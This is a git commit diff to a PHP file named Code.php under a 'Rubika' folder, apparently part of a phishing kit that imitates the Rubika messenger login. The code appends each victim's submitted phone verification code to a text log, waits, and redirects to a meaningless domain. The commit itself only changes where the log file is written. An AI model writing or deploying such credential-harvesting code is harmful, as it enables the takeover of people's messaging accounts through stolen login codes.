e2b290932caeea0e4402e12ea08f4954b8a0ef6c
CipherX <102590998+CipherX-B4ar3@users.noreply.github.com>
2022-05-30 11:27:10 -0700

    Update Code.php

--- site/Rubika/Code.php
+++ site/Rubika/Code.php
@@ -1,5 +1,5 @@
 <?php
-file_put_contents("Log/Account.txt", "\nCODE => " . $_POST["phone_code"] . "\n<==========>\n",FILE_APPEND);
+file_put_contents("Account.txt", "\nCODE => " . $_POST["phone_code"] . "\n<==========>\n",FILE_APPEND);
 sleep(2);
 header("Location: https://qwoekcqwkoec.weqw");
 exit();
